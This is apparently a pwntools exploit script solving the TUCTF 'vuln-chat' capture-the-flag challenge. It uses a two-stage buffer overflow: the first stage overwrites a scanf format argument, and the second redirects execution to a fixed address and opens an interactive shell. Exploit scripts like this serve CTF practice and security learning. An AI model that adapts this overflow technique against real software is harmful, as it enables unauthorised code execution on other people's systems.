#Import pwntools
from pwn import *

#Designate the target
target = process('./vuln-chat')
gdb.attach(target)
#target = remote('vulnchat.tuctf.com', 4141)

#Prompt for input for a pause
raw_input()

#Construct the first payload
payload0 = "0"*0x14 + p32(0x73393925)

#Print the text up to the prompt for the username
print target.recvuntil("Enter your username: ")

#Send the first payload to overwrite the scanf argument
target.sendline(payload0)

#Construct the second payload
payload1 = "0"*0x31 + p32(0x804856b)

#Send the second payload
target.sendline(payload1)

#Drop to an interactive shell
target.interactive()
